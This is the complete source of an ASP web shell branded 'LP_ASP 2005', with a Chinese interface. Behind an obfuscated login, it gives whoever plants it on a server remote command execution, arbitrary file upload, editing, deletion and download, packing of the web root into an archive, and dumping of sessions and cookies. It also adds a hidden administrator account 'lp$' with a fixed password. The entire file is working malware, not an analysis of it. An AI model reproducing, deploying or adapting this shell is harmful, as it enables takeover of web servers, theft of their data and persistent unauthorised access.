<%@codepage=936%><%Response.Expires=0
on error resume next
sub eg:Response.end:end sub
sub ek(k):response.redirect k:end sub
function ee(g):response.write g:end function
function ej(j):ej=server.mappath(j):end function
Co=Request.ServerVariables("URL")
zc="<b>LP_ASP&copy2005"
if session(zc)=5 then
ee"<style>body{font-size:9pt;color:blue}table{font-family:宋体;font-size:9pt}a{font-family:宋体;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:宋体;color:red}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial FONT-COLOR:blue;FONT-SIZE:9pt;}</style>"
Session.TimeOut=50
Server.ScriptTimeout=3000
set lP=Server.CreateObject(session("lP"))
set tN=Server.CreateObject(session("tN"))
set sa=Server.Createobject(session("sa"))
set TV=Server.Createobject(session("TV"))
dN="\\"&tN.ComputerName&"\"&tN.UserName
Rx=Request("pw")
if request("p")then%><SCRIPT RUNAT=SERVER LANGUAGE=VBS>dim zh
CLASS ZB
dim isForm,isFile
Public function Form(sg)
Form=isForm(lcase(sg))
if not isForm.exists(sg)then Form=""
end function
Public function File(sj)
File=isFile(lcase(sj))
if not isFile.exists(sj)then File=new ZI
end function
Private Sub Class_Initialize
dim Rq,sSt,vbCrlf,sx,oE,itt,FE,sFV,sFe,fj,iFE,iFS,iFd,sFN
zz=session("lP")
Sy=session("SY")
set isForm=CreateObject(Sy)
set isFile=CreateObject(Sy)
set tZ=CreateObject(zz)
set zh=CreateObject(zz)
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
Rq=zh.Read
iFS=1
iFd=LenB(Rq)
vbCrlf=chrB(13)&chrB(10)
sSt=MidB(Rq,1,InStrB(iFS,Rq,vbCrlf)-1)
itt=LenB(sSt)
iFS=iFS+itt+1
while (iFS+10)<iFd
oE=InStrB(iFS,Rq,vbCrlf&vbCrlf)+3
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=iFS
zh.CopyTo tZ,oE-iFS
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sx=tZ.ReadText
tZ.Close
iFS=InStrB(oE,Rq,sSt)
fj=InStr(22,sx,"name=""",1)+6
iFE=InStr(fj,sx,"""",1)
sFN=lcase(Mid(sx,fj,iFE-fj))
if InStr(45,sx,"filename=""",1)>0 then
set FE=new ZI
fj=InStr(iFE,sx,"filename=""",1)+10
iFE=InStr(fj,sx,"""",1)
sFe=Mid(sx,fj,iFE-fj)
FE.ff=GA(sFe)
FE.fh=GP(sFe)
fj=InStr(iFE,sx,"Content-Type:",1)+14
iFE=InStr(fj,sx,vbCr)
FE.Fz=Mid(sx,fj,iFE-fj)
FE.FSt=oE
FE.fy=iFS-oE-3
FE.fme=sFN
if not isFile.Exists(sFN)then isFile.add sFN,FE
else
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=oE
zh.CopyTo tZ,iFS-oE-3
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sFV=tZ.ReadText
tZ.Close
if not isForm.Exists(sFN)then isForm.Add sFN,sFV
end if
iFS=iFS+itt+1
wend
Rq=""
set tZ=nothing
End Sub
Private function GP(Ph)
GP=left(Ph,InStrRev(Ph,"\"))
End function
Private function GA(Ph)
GA=mid(Ph,InStrRev(Ph,"\")+1)
End function End CLASS
CLASS ZI
dim FSt,fy,ff,fh,Fz,fme
Public sub SD(Ph,dr)
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FSt
zh.copyto dr,fy
dr.SaveToFile Ph,2
dr.Close
end sub End CLASS</SCRIPT><%set ud=new ZB
fP=ud.isform("fh")
if right(fP,1)<>"\"then fP=fP&"\"
for each fme in ud.isFile
set file=ud.isFile(fme)
if file.ff=""or file.fy<0 then
ee"文件? "
exit for
end if
file.SD fP&file.ff,lP
ee"上传了 "&fP&file.ff&"</br>"
set file=nothing
next
set ud=nothing
ee"<a href=# onclick=history.back()>[返回]</a>"
eg
end if
Err.clear
set fB=Server.CreateObject(session("fB"))
If Err then MN
Rp=Co&"?pw="&Server.URlEncode(Request("jl"))&"&ib="&Request("ib")
select case request("id")
case"edit"edit(0)
case"dir"dir
case"dc"ZD
case"pan"pan
case"FS"MN
case"out"out
case else mz
end select
sub MN%><p align=center><table border=1 width=578 cellspacing=0 cellpadding=0 bgcolor=#61bbd6><tr><td>服务器</td><td width=338><a href=http://<%=Request.ServerVariables("SERVER_NAME")%> target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td></tr><tr><td>IP:端口 时间</td><td><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%>　<%=now%></td></tr><tr><td>CPU数量 OS</td><td><a href=?id=FS&ad=1><%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> 个 </a><a href=?id=FS&ad=2>{<%=Request.ServerVariables("OS")%>}</a></td></tr><tr><td>内网</td><td><%=dN%></td></tr><tr><%t1=timer:for i=1 to 500000:ys=1+1:next:t2=timer:c="%COMSPEC% /c "%><td>运算速度</td><td><%=cstr(int(((t2-t1)*10000)+0.5)/10)%> 毫秒(256M 2.4G为156.3毫秒)</td></tr><tr><td><font color=red>客户端IP→端口 [无代理]</td><td><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>→<%=Request.ServerVariables("REMOTE_PORT")%>
[<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr><tr><td>本文件</td><td><a href=?pw=<%=server.urlencode(left(Co,InStrRev(Co,"/")))%>><%=ej(Co)%></a></td></tr><SCRIPT>function TD(){document.fm.fh.value='<%=REPLACE(ej("."),"\","\\")%>\\..\\';document.fm.fh.focus();return;}</script><TR><TD colspan=2><form method=post name=fm enctype="multipart/form-data" action="?p=8">绝对路径:<input name=fh value="<%=ej(".")%>"size=84><BR></TD></tr><tr><td id=uz width=242>文件1<input type=file name=file></td><td valign=top><INPUT type=button onclick=TD() value=..\><SCRIPT language=javascript>function sm(){fl=document.fm;str='';if(!fl.ut.value)fl.ut.value=1;for(i=1;i<=fl.ut.value;i++)str+='文件'+i+'<input type=file name=file'+i+'><br>';window.uz.innerHTML=str;}</SCRIPT><INPUT type=button onclick=sm() value=设定> 上传 <INPUT value=1 name=ut size=2 maxlength=2> 文件 <input type=submit value=上传> <INPUT type=reset value=重置></td></TR></form></table><SCRIPT LANGUAGE=JavaScript>function DT(ate){document.ko.ok.value=ate;document.ko.ok.focus();return;}</script><form method=post action="http://<%=Request.ServerVariables("SERVER_NAME")&Co%>"name=ko><input type=hidden name=id value=FS><input type=hidden name=nz value=0><input type=submit value=执行> <input type=submit name=ZP value=会话> <input type=submit name=ZG value=服务器变量> <input type=submit name=ih value=退出> <INPUT type=reset value=重置><a href=?> <%=zc%></a><BR>复制:<input name=zk> 目的路径:<input name=zl><br>移动:<input name=zm> 目的路径:<input name=zn><br>程序:<input name=zo> 别加参数:<input name=zq><br>浏览:<input name=ZJ> DOS 命令:<input name=ok value="<%=c%>"><br>下载:<input name=pw> 快捷 DOS:<SELECT onchange=DT(this.options[this.selectedIndex].value)><OPTION value=<%=c%>>常用DOS命令</OPTION><OPTION value="<%=c%>set">[set]</OPTION><OPTION value="<%=c%>net localgroup administrators&net user">[NET USER]</OPTION><OPTION value="<%=c%>dir <%=ej(".")%>">[dir .]</OPTION><OPTION value="<%=c%>md <%=ej(".")%>\..\">[MD ..\]</OPTION><OPTION value='<%=c%>"\Program Files\winrar\rar.exe" a -r <%=ej("/")%>\lp.rar <%=ej("/")%>'>[打包RAR]</OPTION><OPTION value="<%=c%>ipconfig">[服务器IP]</OPTION><OPTION value="<%=c%>net start">[启动的服务]</OPTION><OPTION value="<%=c%>netstat -an">[netstat-an]</OPTION><OPTION value="<%=c%>query user">[query user]</OPTION><OPTION value="<%=c%>net user lp$ www.zh1891.com /add&net localgroup administrators lp$ /add">[加 LP$ 进管理组]</OPTION></SELECT></form><hr><%if Request("ih")<>""then out
oa=Request("ad")
if oa>=1 then
oz="WinNT://."
Set ob=GetObject(oz)
if oa=1 then:Set od=ob.Create("user","lp$"):od.SetPassword "www.zh1891.com":od.SetInfo:Set oe=GetObject(oz&"/Administrators,group"):oe.ADD oz&"/lp$"
ob.Filter=Array("group")
For Each a In ob
ee"<br>"&a.Name&"<hr>"
For Each b in a.Members
ee"<br>"&b.Name
Next
Next
eg
end if
if Request("cy")=2 or request("zt")<>""then
edit(3)
eg
end if
if Rx<>""and Request("nz")=0 then
ZD
eg
end if
if Request("ZP")<>""then
cs
eg
end if
if Request("ZG")<>""then
ee"服务器所有变量</p>"
for each Y in request.servervariables
ee Y&"<br>"&request.servervariables(Y)&"<HR>"
next
end if
hz=Request("ok")
if hz<>""and hz<>c then
on error resume next
ee"执行:"&hz&"<br><xmp>"&TV.exec(hz).stdout.readall&"</xmp>"
if Err then
ee Err.Description
T=ej("lp"&year(date)&Session.SessionID&".txt")
TV.run hz&">>"&T,1,True
lP.Open
lP.Type=2
lP.CharSet="gb2312"
lp.LoadFromFile(T)
ee hz&"<br><xmp>"&lp.ReadText
lp.Close
nd=timer
do while (timer-1)<nd
loop
TV.run c&"echo Y|del "&T,1,True
set TV=Nothing
end if
end if
sz=Request("ZJ")
if sz<>""then
if right(sz,1)<>"\"then sz=sz&"\"
if len(sz)>3 then
sz=left(sz,InStrRev(sz,"\")-1)
pw=left(sz,InStrRev(sz,"\"))
else
sz=left(sz,1)&":\"
pw=sz
end if
ee"<table border=1 width=99% cellspacing=0 bgcolor=white><tr><TD width='60%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&pw&"><b>上级("&pw&")</a><a href=?id=FS&nz=1&zj="&Request("ZJ")&"><b>目录</a><a href=?id=FS&nz=2&zj="&Request("ZJ")&"><b>入库↓</a></td><td>大小</td><td width='20%'><b>操作</td></tr>"
for each Z in sa.namespace(sz).items
if Z.size=0 then
ee"<tr><TD width='60%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&Server.URlEncode(Z.path)&">"&Z.path&"</a></td><td></td><td width='20%'><a href=/"&Server.URlEncode(Co)&"?id=FS&zj="&Server.URlEncode(z.path)&">"&Z.Type&"</a></td></tr>"
else
if Request("nz")=2 then pk=pc(Z.path)
ee"<tr><TD><a href=/"&Server.URlEncode(Co)&"?id=FS&pw="&Server.URlEncode(Z.path)&"&nz=0>"&pk&Z.path&"</a></td><td>"&Z.size&"</td><td><a href=/"&Server.URlEncode(Co)&"?id=FS&pw="&Server.URlEncode(Z.path)&"&ib=1&cy=2 target=_blank>编辑</a></td></tr>"
if Request("nz")=1 then ee"<script>window.open('"&Co&"?id=FS&pw="&Server.URlEncode(Z.path)&"&nz=0')</script>"
end if
next
ee"</table>"
eg
end if
z1=Request("zk"):z2=Request("zl"):if z1<>""and z2<>""then:if right(z2,1)<>"\"then z2=z2&"\":for i=len(z1) to 1 step -1:if mid(z1,i,1)="\"then:pw=left(z1,i-1):exit for:end if:next:if len(pw)<3 then pw=pw&"\":pz=right(z1,len(z1)-i):sa.namespace(z2).copyhere sa.namespace(pw).parsename(pz):ee"ok":end if
z3=Request("zm"):z4=Request("zn"):if z3<>""and z4<>""then:if right(z4,1)<>"\"then z4=z4&"\":for i=len(z3) to 1 step -1:if mid(z3,i,1)="\"then:pw=left(z3,i-1):exit for:end if:next:if len(pw)<3 then pw=pw&"\":pv=right(z3,len(z3)-i):sa.namespace(z4).movehere sa.namespace(pw).parsename(pv):ee"ok!":end if
z5=Request("zo"):z6=Request("zq"):if z5<>""and z6<>""then:if right(z5,1)<>"\"then z5=z5&"\":sa.namespace(z5).items.item(z6).invokeverb:ee"Do":end if
if request("a")then
FOR EACH g IN Application.Contents
ee"<BR>"&g&Application.Contents(g)
NEXT
eg
end if
If Request.ServerVariables("Content_Length")=0 Then ee"<Iframe src='http://"&Request.ServerVariables("SERVER_NAME")&"' width=99% height=99% frameborder=0></iframe>"
end sub
sub mz
zw=Rx
if right(zw,1)<>"/"then zw=Rx&"/"
if Request("ib")="1"then
zv=zw
ib=1
else
zv=ej(zw)
ib=""
end if%><script language=JavaScript>function crfile(ls){if(ls==""){alert("文件名?");}else{window.open("/<%=Server.URlEncode(Co)%>?id=edit&ib=<%=request("ib")%>&cy=1&pw=<%=Server.URlEncode(zw)%>"+ls)}}function crdir(ls){if (ls==""){alert("目录名?");}else{window.open("/<%=Server.URlEncode(Co)%>?id=dir&ib=<%=request("ib")%>&op=cz&pw=<%=Server.URlEncode(zw)%>"+ls)}}</script><script LANGUAGE=VBS>ib="<%=request("ib")%>"
sub cf(zu)
dz=trim(InputBox("源文件："&zu&vbLf&"到(带路径 例c:/或c:\):"))
if dz=""then
alert"文件?"
else
window.open"/<%=Server.URlEncode(Co)%>?id=edit&pw="+zu+"&op=copy&ib=1&dx="+dz
end If end sub</script><center><TABLE border=1 cellSpacing=1 cellPadding=1 bgColor=#addddd><tr><td colspan=4><a href=?id=out title=退出>本文件: <%=ej(Co)%></a></td></tr><TD colspan=4 bgcolor=white>切换盘符：<%For Each thing in fB.Drives
ee"<a href=?pw="&thing.DriveLetter&":&ib=1>"&thing.DriveLetter&":</a> "
NEXT%>内网：<%=dN%></TD><tr><TD colspan=4><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>:<%=Request.ServerVariables("REMOTE_PORT")%> [<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font><a href=?id=pan target=_blank> 盘 </a><%=now%><a href=<%=Co%>?id=FS> <%=zc%> </a><%if Request("ib")=""then%><a href=?path=<%=zw%>&php=7> PHP 探针 </a><%end if%><font color=red><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%></TD></tr><TD colspan=4 bgcolor=white><a href=?pw=<%if Request("ib")="1"then%><%=Server.URlEncode(Request("jl"))%> title=换到相对路径<%else%><%=Server.URlEncode(zv)%>&ib=1&jl=<%=Server.URlEncode(zw)%> title=换到绝对路径<%end if%>><%if Request("ib")="1"then%>绝<%else%>相<%end if%>对路径 <%=zv%></a> 当前目录:<%=zw%></TD><TR><TD colspan=4><form>
浏览目录: <input name=pw size=90 value=c:><input type=hidden name=ib value=1> <input type=submit value=浏览></TD></form></TR><TR bgColor=white><form><TD colspan=4>建特殊符号目录或文件 #用%23 %用%25 &用%26 +用%2B '用%27 <input name=fn size=44> <input type=button onclick=crfile(fn.value) value=建文件> <input type=button value=建目录 onclick=crdir(fn.value)></TD></form></TR><TR><TD width=210 valign=top rowspan=2><%if fB.FolderExists(zv)then
Set Fc=fB.GetFolder(zv)
Set fg=Fc.SubFolders
fk=left(zw,Abs(len(zw)-(len(Fc.name)+1)))
ee"<a href=?pw="&Server.URlEncode(fk)&"&ib="&ib&"><b>■↑上级目录</a><br>"
For Each z In fg
ee"<a href=?pw="&Server.URlEncode(zw&z.Name)&"&ib="&ib&">└□ "&z.name&"</a> <a href=?id=dir&pw="&Server.URlEncode(zw&z.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick="&chr(34)&"return confirm('删除"&Server.URlEncode(z.Name)&"?')"&chr(34)&">×删除</a><br>"
Next%></TD><TD width=232><a href=?pw=<%=fc%>&d=1&ib=1 title=批量下载>文件</a><a href=?pw=<%=fc%>&d=2&ib=1>↓入库</a></TD><TD width=108 align=right>属性 大小</TD><TD width=94>操作</TD></TR><TR><TD colspan=3 valign=top bgColor=WHITE><table width=528 cellspacing=0 cellpadding=2><%Set FEs=Fc.Files
For Each x In FEs
if Request("ib")="1"then
if Request("d")=1 then pk="<script>window.open('"&Co&"?id=dc&pw="&Server.URlEncode(Fc&"\"&x.Name)&"')</script>"
if Request("d")=2 then pk=pc(Fc&"\"&x.Name)
shz="<a href=?id=dc&pw="&Server.URlEncode(zw&x.Name)&" title='"&"类型"&x.type&chr(10)&"时间："&x.DateLastModified&"'>"&pk&x.Name&"</a>"
else
shz="<a href=/"&Server.URlEncode(Right(zw,len(zw)-1)&x.name)&" title='"&"类型"&x.type&chr(10)&"时间："&x.DateLastModified&"'target=_blank>"&x.Name&"</a>"
end if
ee"<tr><td width=356 style='border-bottom:1 solid blue'>"&shz&"</td><td width=80 style='border-bottom:1 solid blue'>"&x.Attributes&" "&x.size&"</td><td width=92 style='border-bottom:1 solid blue'><a href=/"&Server.URlEncode(Co)&"?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&ib="&ib&" target=_blank>编辑 </a><a href=?id=edit&pw="&Server.URlEncode(zw&x.Name)&"&op=del&ib="&ib&"&jl="&Server.URlEncode(zw)&" onclick=""return confirm('删除"&x.Name&"?')"">删除</a>"
if Request("ib")="1"then ee"<a href=# onclick=cf('"&Server.URlEncode(zw&x.Name)&"')> 复制</a>"
ee"</td></tr>"
Next
end if%></table></TD></TR></TABLE><%end sub
function pc(pg)
On Error resume Next
if pg<>ej("/lp.rar")then
lP.Open
lP.Type=1
lP.LoadFromFile pg
pb="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&ej("/lp.rar")
Set pj=Server.CreateObject("ADODB.CONNECTION")
Set rs=Server.CreateObject("ADODB.RecordSet")
pj.open pb
if Err then
Err.clear
Set Ca=Server.CreateObject("ADOX.Catalog")
Ca.Create pb
pj.open pb
pj.Execute"CREATE TABLE wz(ID int IDENTITY(1,1) PRIMARY KEY CLUSTERED,name VARCHAR,body image)"
Set Ca=Nothing
end if
rs.Open "select * from wz",pj,3,3
rs.addnew
rs("name")=pg
rs("body")=lp.read
rs.update
lp.close
rs.close
pj.close
Set pj=Nothing
Set rs=Nothing
pc="▲"
end if end function
sub pan:For Each pa in fB.Drives:On Error Resume Next:pa1=pa.AvailableSpace:if pa1/1024/1024<1024 then:pa1=round(pa1/1024/1024*100)/100&" MB":else:pa1=round(pa1/1024/1024/1024*100)/100&" GB":end if:pa2=round(pa.TotalSize/1024/1024/1024*100)/100:pa3=pa.DriveType:select case pa3:case 0 pa3="未知":case 1 pa3="软盘":case 2 pa3="硬盘":case 3 pa3="网络":case 4 pa3="光驱":case 5 pa3="RAM盘":end select:ee"<a href=?pw="&pa.DriveLetter&":&ib=1>"&pa3&" "&pa.DriveLetter&"文件系统:"&pa.FileSystem&"容量"&pa2&" GB可用空间"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>":next:end sub
sub edit(R)
pF=Rx
if request("ib")<>"1"then pF=ej(pF)
if request("op")="del"then
if lcase(fB.GetFile(pF))<>lcase(ej(Co))then:fB.GetFile(pF).Delete True:end if
ek Rp
end if
if request("op")="copy"then
dx=Request("dx")
fB.GetFile(pF).copy dx
ok("复制"&pF&" 到"&dx)
end if
if request("zt")=""then
if Request("cy")<>1 and Request("cy")<>2 then
Set ZF=fB.OpenTextFile(pF,1,False)
Za=Server.HTMLEncode(ZF.readall)
ZF.Close
elseif Request("cy")=2 then
lP.Open
lP.Type=2
lP.CharSet="gb2312"
lp.LoadFromFile(pF)
Za=Server.HTMLEncode(lp.ReadText)
lp.Close
end if%><SCRIPT language=JavaScript>var i=0;var ie=(document.all)?1:0;var ns=(document.layers)?1:0;function selectCode(){if(document.pad.zt.value.length>0){document.pad.zt.focus();document.pad.zt.select();}else alert('内容?')}function preview(){if(document.pad.zt.value.length>0){pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");pr.document.write(document.pad.zt.value);}else alert('预览内容?')}function uncompile(){if(document.pad.zt.value.length>0){source=unescape(document.pad.zt.value);document.pad.zt.value=""+source+"";i++;alert("解密"+i+"次!");}else alert('内容?')}</SCRIPT><form method=post name=pad action='<%=Server.URlEncode(Co)%>?id=edit&ib=<%=Request("ib")%>'><CENTER><TD>编辑文件名：<input name=pw value="<%=Rx%>"></TD><BR><TD><textarea rows=30 cols=100% name=zt><%=Za%></textarea></TD><BR><TD><input type=submit value=提交 accesskey=s> <INPUT onclick=selectCode() type=button value=全选> <INPUT onclick=preview() type=button value=预览>
<INPUT onclick=uncompile() type=button value=JAVA解密> <INPUT type=reset value=重置></TD></form><%elseif R=3 then
lP.Open:lP.Type=2:lP.CharSet="gb2312":lP.writetext request("zt"):lP.SaveToFile pF,2:lP.Close:ok(pF)
else
fB.CreateTextFile(pF).Write Request("zt"):ok(pF)
end if end sub
sub ok(z):ee"<SCRIPT>alert('完成："+REPLACE(z,"\","\\")+"');window.close()</SCRIPT>":end sub
sub dir:if Request("ib")<>"1"then Rx=ej(Rx):if request("op")="del"then:fB.DeleteFolder Rx,True:ek Rp:end if:if request("op")="cz"then:set fjl=fB.CreateFolder(Rx):CreateFolderDemo=fjl.Path:ok(Rx):end if
end sub
SUB ZD
zr=REPLACE(Trim(Rx),"/","\")
lP.Open
lP.Type=1
lP.LoadFromFile(zr)
for i=len(zr) to 1 step -1
if mid(zr,i,1)="\"then exit for
next
ny=right(zr,len(zr)-i)
Response.Clear
Response.AddHeader"Content-Disposition","attachment;filename="&ny
Response.CharSet="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite lP.Read
lP.Close
Set lP=nothing
End SUB
sub cs%><center><table width=588 border=1 cellpadding=0 cellspacing=0><form name=fc method=post action="?id=FS&sc=6"><tr><td height=27>response.cookies(<input name=co1 value="<%=co1%>" size=15>)(<input name=co2 value="<%=co2%>" size=15>)=<input name=cov value='<%=cov%>' size=15><input name=Submit type=submit value="建COOKIES"></td></tr></form><tr><td height=27><%ee"当前此站你COOKIES：<a href='?id=FS&sc=6&a=1'>APPLICATION: "&application.Contents.Count&"</a><br>"
For Each c in Request.Cookies
If Request.Cookies(c).HasKeys Then
For Each K in Request.Cookies(c)
ee"<b>response.cookies('"&c&"')('"&K&"')</b>="&Request.Cookies(c)(K)&"<a href='?id=FS&sc=6&dk="&Server.URlEncode(c)&"'> 清除</a><br>"
Next
Else
ee"<b>response.cookies('"&c&"')</b>="&Request.Cookies(c)&"<a href='?id=FS&sc=6&dk="&Server.URlEncode(c)&"'> 清除</a><br>"
End If
Next%></td></tr><form name=fs method=post action="?id=FS&sc=6"><tr><td height=27>session(<input name=s1 value="<%=s1%>" size=15>)=<input name=sv value="<%=sv%>" size=15>
<input name=Submit type=submit value="建SESSION">
<input name=cc type=submit value="清除所有SESSION"></td></tr></form><tr><td height=27><%ee"此站SESSION数量: "&Session.Contents.Count&" ID: "&Session.SessionID&"<br>"
For Each s in Session.Contents
If IsArray(Session(s))then
For iLoop=LBound(Session(s)) to UBound(Session(s))
ee"session('"&Server.HTMLEncode(s)&")("&iLoop&")="&Session(s)(iLoop)&"<a href='?id=FS&sc=6&ds="&Server.URlEncode(s)&"'> 清除</a><BR>"
Next
Else
ee"session('"&Server.HTMLEncode(s)&"')="&Session.Contents(s)&"<a href='?id=FS&sc=6&ds="&Server.URlEncode(s)&"'> 清除</a><BR>"
End If
next%></td></tr></table><%end sub
if request("sc")=6 then
co1=request("co1")
co2=request("co2")
cov=request("cov")
s1=request("s1")
sv=request("sv")
if co1<>""then
Response.Cookies(co1).Expires=Date+30
if co2<>""then
Response.Cookies(co1)(co2)=cov
else
Response.Cookies(co1)=cov
end if
cs
end if
eu="?id=FS&ZP=6"
if request("ds")<>""then
session.Contents.Remove(request("ds"))
ek eu
end if
if request("dk")<>""then
Response.Cookies(request("dk")).Expires=Date-1
ek eu
end if
if s1<>""then:session(s1)=sv:cs:end if
if request("cc")<>""then
Session.Contents.RemoveAll
Session(zc)=5
ek eu
end if
end if
sub out:Session(zc)=0:eg:End sub
if request("php") then:TQ=ej(FB.GetTempName()&".php"):fB.CreateTextFile(TQ).Write"<? phpinfo();//遗憾:不支持PHP ?>":ee"<script>window.open('"&fB.GetFileName(TQ)&"')</script>":Response.Flush:nd=timer:do while (timer-1)<nd:loop:FB.DeleteFile TQ,True:end if
else
function Ez(m):tpa=StrReverse(left(m&"lanpinglp",9)):tpn=len(m):pd="":for l=1 to 9:pd=pd+chr(asc(mid(tpa,l,1))-tpn+int(l*1.1)):next:Ez=Server.URlEncode(pd):end function
if Ez(request("az"))="fnjrqeqvs"and Ez(request("aw"))="fnmam7347"then
session(zc)=5
session("lp")=request("lP")
session("tN")=request("tN")
session("sa")=request("sa")
session("TV")=request("TV")
session("fB")=request("fB")
session("SY")=request("SY")
ek Co
else
Session(zc)=Session(zc)+1:if Session(zc)=4 then ek"http://"&Request.ServerVariables("SERVER_NAME")
if Session(zc)>4 then ee"<script>self.window()</script>"
end if end if%>